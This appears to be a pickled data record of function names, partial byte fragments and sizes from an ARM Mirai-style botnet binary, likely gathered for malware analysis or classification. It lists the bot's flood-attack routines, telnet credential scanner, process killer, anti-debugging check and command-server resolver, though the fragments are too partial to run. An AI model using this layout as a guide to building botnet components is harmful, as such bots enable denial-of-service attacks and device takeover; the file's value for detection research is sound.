(lp0
(S'.init_proc'
p1
S'0ddfe200eb2700'
p2
L24L
tp3
a(S'strcpy'
p4
S'00'
p5
L12L
tp6
a(S'ioctl'
p7
S'00'
p8
L12L
tp9
a(S'recv'
p10
S'00'
p11
L12L
tp12
a(S'connect'
p13
S'00'
p14
L12L
tp15
a(S'sigemptyset'
p16
S'00'
p17
L12L
tp18
a(S'memmove'
p19
S'00'
p20
L12L
tp21
a(S'getpid'
p22
S'00'
p23
L12L
tp24
a(S'prctl'
p25
S'00'
p26
L12L
tp27
a(S'memcpy'
p28
S'00'
p29
L12L
tp30
a(S'readlink'
p31
S'00'
p32
L12L
tp33
a(S'malloc'
p34
S'00'
p35
L12L
tp36
a(S'sleep'
p37
S'00'
p38
L12L
tp39
a(S'recvfrom'
p40
S'00'
p41
L12L
tp42
a(S'socket'
p43
S'00'
p44
L12L
tp45
a(S'select'
p46
S'00'
p47
L12L
tp48
a(S'readdir'
p49
S'00'
p50
L12L
tp51
a(S'sigaddset'
p52
S'00'
p53
L12L
tp54
a(S'send'
p55
S'00'
p56
L12L
tp57
a(S'abort'
p58
S'00'
p59
L12L
tp60
a(S'accept'
p61
S'00'
p62
L12L
tp63
a(S'calloc'
p64
S'00'
p65
L12L
tp66
a(S'write'
p67
S'00'
p68
L12L
tp69
a(S'kill'
p70
S'00'
p71
L12L
tp72
a(S'bind'
p73
S'00'
p74
L12L
tp75
a(S'inet_addr'
p76
S'00'
p77
L12L
tp78
a(S'chdir'
p79
S'00'
p80
L12L
tp81
a(S'setsockopt'
p82
S'00'
p83
L12L
tp84
a(S'signal'
p85
S'00'
p86
L12L
tp87
a(S'read'
p88
S'00'
p89
L12L
tp90
a(S'unlink'
p91
S'00'
p92
L12L
tp93
a(S'sendto'
p94
S'00'
p95
L12L
tp96
a(S'realloc'
p97
S'00'
p98
L12L
tp99
a(S'listen'
p100
S'00'
p101
L12L
tp102
a(S'fork'
p103
S'00'
p104
L12L
tp105
a(S'__uClibc_main'
p106
S'00'
p107
L12L
tp108
a(S'memset'
p109
S'00'
p110
L12L
tp111
a(S'getppid'
p112
S'00'
p113
L12L
tp114
a(S'time'
p115
S'00'
p116
L12L
tp117
a(S'opendir'
p118
S'00'
p119
L12L
tp120
a(S'getsockopt'
p121
S'00'
p122
L12L
tp123
a(S'__errno_location'
p124
S'00'
p125
L12L
tp126
a(S'exit'
p127
S'00'
p128
L12L
tp129
a(S'atoi'
p130
S'00'
p131
L12L
tp132
a(S'open'
p133
S'00'
p134
L12L
tp135
a(S'clock'
p136
S'00'
p137
L12L
tp138
a(S'setsid'
p139
S'00'
p140
L12L
tp141
a(S'closedir'
p142
S'00'
p143
L12L
tp144
a(S'fcntl'
p145
S'00'
p146
L12L
tp147
a(S'close'
p148
S'00'
p149
L12L
tp150
a(S'raise'
p151
S'00'
p152
L12L
tp153
a(S'free'
p154
S'00'
p155
L12L
tp156
a(S'sigprocmask'
p157
S'00'
p158
L12L
tp159
a(S'getsockname'
p160
S'00'
p161
L12L
tp162
a(S'__do_global_dtors_aux'
p163
S'30e900d50053e3800094e520e3000a833002a0e520e3'
p164
L104L
tp165
a(S'call___do_global_dtors_aux'
p166
S'042d'
p167
L8L
tp168
a(S'frame_dummy'
p169
S'3c9fe500042de51011'
p170
L68L
tp171
a(S'call_frame_dummy'
p172
S'042d'
p173
L8L
tp174
a(S'_start'
p175
S'00a0e420e500e5c00c9fe5'
p176
L44L
tp177
a(S'attack_app_http'
p178
S''
p179
L7112L
tp180
a(S'attack_get_opt_str'
p181
S'10e903e120e2c004d10253e11005005ce1e0e1c000'
p182
L68L
tp183
a(S'attack_get_opt_ip'
p184
S'10e9ff0203e130eb00010010e804a0'
p185
L48L
tp186
a(S'attack_get_opt_int'
p187
S'10e9ff0203e130eb000aa00a40bdea'
p188
L52L
tp189
a(S'attack_start'
p190
g179
L204L
tp191
a(S'attack_parse'
p192
g179
L532L
tp193
a(S'attack_kill_all'
p194
S'10e90094e50009a01b30e430e1'
p195
L52L
tp196
a(S'add_attack'
p197
g179
L92L
tp198
a(S'attack_init'
p199
S'042de310eb00e5'
p200
L132L
tp201
a(S'attack_gre_eth'
p202
g179
L1588L
tp203
a(S'attack_gre_ip'
p204
g179
L1480L
tp205
a(S'attack_tcp_stomp'
p206
g179
L1964L
tp207
a(S'attack_tcp_ack'
p208
g179
L1628L
tp209
a(S'attack_tcp_syn'
p210
g179
L1652L
tp211
a(S'attack_udp_plain'
p212
g179
L600L
tp213
a(S'attack_udp_generic'
p214
g179
L1204L
tp215
a(S'attack_udp_vse'
p216
g179
L1120L
tp217
a(S'attack_udp_dns'
p218
g179
L1720L
tp219
a(S'checksum_generic'
p220
S'00a0ead002e1c0000241e2'
p221
L80L
tp222
a(S'checksum_tcpudp'
p223
S'702de140800022e1e0e300ead102e1e0e010e3c0ff00d104a0e128e138e530e024e030eaa0e0281a00e108e1'
p224
L152L
tp225
a(S'mem_exists'
p226
S'0153e1402dd3e0e140a0da000cd400d00253e1c0001a00001a00e80151e2'
p227
L88L
tp228
a(S'killer_kill'
p229
S'089fe500e3'
p230
L16L
tp231
a(S'killer_kill_by_port'
p232
g179
L1392L
tp233
a(S'killer_init'
p234
g179
L1644L
tp235
a(S'anti_gdb_entry'
p236
S'089fe530e5'
p237
L16L
tp238
a(S'teardown_connection'
p239
S'10e90094e5005fe71b30e300e540bd'
p240
L40L
tp241
a(S'ensure_single_instance'
p242
g179
L348L
tp243
a(S'main'
p244
g179
L2128L
tp245
a(S'resolve_cnc_addr'
p246
S'702de308eb10e308eb00eb50a0e308eb0058609fe580140000d51a000094e700e500eb00eb10e308eb20e530e534e124e100e530e540bd'
p247
L140L
tp248
a(S'rand_next'
p249
S'702de5609fe530e5e0e5409fe53522009ee5c004e010e52070'
p250
L72L
tp251
a(S'rand_str'
p252
S'30e901e100ea00e2'
p253
L100L
tp254
a(S'rand_alphastr'
p255
S'30e900e140a0e210e3e4eb00ea000520e2c02153e520e330e404e1'
p256
L140L
tp257
a(S'rand_init'
p258
S'30e93d30e5e3eb40a0eb509fe5402400e5e4eb30e530e030e500'
p259
L76L
tp260
a(S'resolv_skip_name'
p261
S'042de3e0e300ea000c833901a0e000ea80001a30e230e500'
p262
L104L
tp263
a(S'resolv_entries_free'
p264
S'10e91094e50030ff04a0e8'
p265
L36L
tp266
a(S'resolv_domain_to_hostname'
p267
S'30e901a0e108ebe0e100e2c000d501840053e30000ce0504a003c001e20001e100018c'
p268
L112L
tp269
a(S'resolv_lookup'
p270
g179
L1024L
tp271
a(S'consume_any_prompt'
p272
S'1890e510e200ea52e300050003002352e3000a001a00e3'
p273
L96L
tp274
a(S'can_consume'
p275
S'1890e500e000e10033'
p276
L32L
tp277
a(S'scanner_kill'
p278
S'089fe500e3e2'
p279
L16L
tp280
a(S'deobf'
p281
S'702de150a0eb006a'
p282
L92L
tp283
a(S'add_auth_entry'
p284
g179
L268L
tp285
a(S'setup_connection'
p286
g179
L212L
tp287
a(S'recv_strip_null'
p288
S'10e9c3e1eb00100004d20053e3300701820010'
p289
L64L
tp290
a(S'scanner_init'
p291
g179
L5848L
tp292
a(S'table_retrieve_val'
p293
S'209fe501e000053015021130'
p294
L40L
tp295
a(S'toggle_obf'
p296
g179
L148L
tp297
a(S'table_lock_val'
p298
S'ff00d6'
p299
L8L
tp300
a(S'table_unlock_val'
p301
S'ff00d4'
p302
L8L
tp303
a(S'add_entry'
p304
g179
L72L
tp305
a(S'table_init'
p306
S'042de313e3'
p307
L808L
tp308
a(S'util_strlen'
p309
S'00a0e300ead00053e3'
p310
L32L
tp311
a(S'util_memcpy'
p312
S'00a0eacce7c0'
p313
L32L
tp314
a(S'util_strcpy'
p315
S'10e9000002e130e7000184fa'
p316
L44L
tp317
a(S'util_zero'
p318
S'00a0eac220e2'
p319
L32L
tp320
a(S'util_itoa'
p321
g179
L208L
tp322
a(S'util_memsearch'
p323
S'0153e1402de100e140a0d100da000cd40500018c00a01a00001a00e80150e1'
p324
L96L
tp325
a(S'util_atoi'
p326
g179
L308L
tp327
a(S'util_fdgets'
p328
g179
L96L
tp329
a(S'util_local_addr'
p330
g179
L148L
tp331
a(S'util_stristr'
p332
g179
L132L
tp333
a(S'util_strcmp'
p334
S'00a0eadc0053e3'
p335
L112L
tp336
a(S'util_strncmp'
p337
S'042de1e0e300eade0053e3'
p338
L120L
tp339
a(S'__udivsi3'
p340
S'0151e2'
p341
L248L
tp342
a(S'__aeabi_uidivmod'
p343
S'03e90640bde0100e'
p344
L24L
tp345
a(S'__umodsi3'
p346
S'0151e2003a0000a081'
p347
L204L
tp348
a(S'__modsi3'
p349
S'0051e3000a1000b00060420151e20000a081009a51e30001a032'
p350
L228L
tp351
a(S'__do_global_ctors_aux'
p352
S'289fe520e50010e910a0e120fa'
p353
L48L
tp354
a(S'call___do_global_ctors_aux'
p355
S'042d'
p356
L8L
tp357
a(S'.term_proc'
p358
S'0ddfe2d9ebaf1b'
p359
L20L
tp360
a.